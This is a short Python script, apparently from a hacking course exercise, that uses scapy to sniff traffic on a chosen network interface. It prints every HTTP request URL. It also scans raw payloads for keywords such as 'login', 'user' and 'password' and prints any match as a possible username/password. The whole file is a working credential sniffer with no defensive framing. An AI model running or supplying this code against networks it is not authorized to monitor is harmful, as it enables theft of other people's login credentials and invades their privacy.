#!/usr/bin/env python

import scapy.all as scapy
import argparse
from scapy.layers import http


def getArguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="Pick an interface to sniff packets on.")
    (options) = parser.parse_args()
    return options


def sniffer(interface):
    scapy.sniff(iface=interface, store=False, prn=sniffPacket)


def getLoginInfo(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        keywords = ["login","user","username","pass","password"]
        for key in keywords:
                if key in load:
                    return load


def sniffPacket(packet):
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print("[+] HTTPRequest >> " + str(url))

        loginInfo = getLoginInfo(packet)
        if loginInfo:
            print("\n\n[+] Possible username/password >> " + loginInfo + "\n\n")


options = getArguments()
interface = options.interface
sniffer(interface)
